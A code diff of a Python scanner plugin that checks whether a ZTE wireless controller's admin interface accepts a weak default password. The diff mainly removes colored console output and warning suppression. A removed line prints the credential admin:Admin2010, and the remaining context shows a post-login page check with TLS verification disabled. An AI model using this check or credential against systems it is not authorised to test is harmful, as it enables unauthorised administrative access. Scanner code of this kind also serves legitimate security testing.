@@ -8,8 +8,7 @@ description: 中兴无线控制器存在弱口令可直接登录管理员界面�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
 
 class zte_wireless_weak_pass_BaseVerify:
     def __init__(self, url):
@@ -33,18 +32,14 @@ class zte_wireless_weak_pass_BaseVerify:
             vulnurl2 = self.url + "/main.php"
             req2 = sess.get(vulnurl2, headers=headers, timeout=10, verify=False)
             if r"Welcome.php" in req2.text and r"Selector.php" in req2.text:
-                cprint("[+]存在中兴无线控制器弱口令漏洞...(高危)\tpayload: "+vulnurl+"\t弱口令: admin:Admin2010", "red")
                 return True, vulnurl, "中兴无线控制器弱口令", str(payload), req.text
             else:
-                cprint("[-]不存在zte_wireless_weak_pass漏洞", "white", "on_grey")
                 return False, None, None, None, None
 
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = zte_wireless_weak_pass_BaseVerify(sys.argv[1])
     testVuln.run()
